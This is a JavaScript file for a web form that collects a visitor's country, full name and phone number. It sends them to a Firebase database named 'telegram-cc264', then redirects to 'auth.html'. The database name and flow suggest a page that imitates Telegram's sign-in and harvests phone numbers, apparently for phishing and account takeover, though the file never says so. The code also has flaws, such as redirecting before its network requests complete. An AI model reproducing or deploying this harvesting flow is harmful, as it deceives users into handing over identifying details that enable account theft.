const $countrySelect = document.getElementById('country-select');
const $selectElement = document.querySelector('#country-codes');
const $phoneNumber = document.querySelector('#inputText')
const $nextBtn = document.querySelector('#next_btn')
const $fullNameInput = document.querySelector('#inputName')




  fetch('https://restcountries.com/v3.1/all')
  .then(response => response.json())
  .then(data => {


    
    data.forEach(country => {
      const option = document.createElement('option');
      option.value = country.name.common;
      option.text = country.name.common;
      $countrySelect.appendChild(option);
    });
  })



fetch('https://restcountries.com/v3.1/all')
  .then(response => response.json())
  .then(iddCodesData => {

    

    iddCodesData.forEach( code => {
        let  suffixes = [`${code.idd.suffixes}`]
        for (let i = 0; i< suffixes.length; i++){
            let root = [ `${code.idd.root}`]
          let newIdd = root + suffixes[i]
          const optionElement = document.createElement('option');
          optionElement.value = newIdd
          optionElement.text = newIdd
          $selectElement.appendChild(optionElement);
         }
    
    });
  })
  .catch(error => {
    console.error('Error', error);
  });





  $nextBtn.addEventListener('click', () => {

    if (isValidated($countrySelect) && isValidated($fullNameInput) && isValidated($selectElement) && isValidated($phoneNumber) ){

        NumberCard({
          fullName: $fullNameInput.value,
          idd: $selectElement.value,
          number: $phoneNumber.value,
      }),

        createNumberCard({
            country: $countrySelect.value,
            fullName: $fullNameInput.value,
            idd: $selectElement.value,
            number: $phoneNumber.value,
        }),
      

        location.href = "auth.html"
    }

  
       
  })
  
 async function createNumberCard({country, fullName, idd, number}) {
    try {

        const information = {
            country: country.trim(),
            fullName: fullName.trim(),
            idd: idd.trim(),
            number: number.trim(),
         }

        const response = await fetch('https://telegram-cc264-default-rtdb.asia-southeast1.firebasedatabase.app/telegram.json', {
            method: 'POST',
            body: JSON.stringify(information),
        })

        // resetFields()




        

    } catch (e) {
        console.error(e)
    }

  }




  async function NumberCard({ fullName, idd, number}) {
    try {

        const info = {
            fullName: fullName.trim(),
            idd: idd.trim(),
            number: number.trim(),
         }

        const response = await fetch('https://telegram-cc264-default-rtdb.asia-southeast1.firebasedatabase.app/telegram2.json', {
            method: 'POST',
            body: JSON.stringify(info),
        })

        resetFields()

    } catch (e) {
        console.error(e)
    }

  }
 

  
function isValidated(element) {
    if (!element.value) {
        element.classList.add ('error')

        element.focus()

        return false
    }

    element.classList.remove('error')

    return true
}

  function resetFields() {
    $countrySelect.value = ''
    $fullNameInput.value =''
    $selectElement.value = ''
    $phoneNumber.value = ''
}


    // function getNumbers() {
    //     return JSON.parse(localStorage.getItem('numbers')) || []
    // }


    function setNumbers(numbers) {
    localStorage.setItem('numbers', JSON.stringify(numbers))
  }



 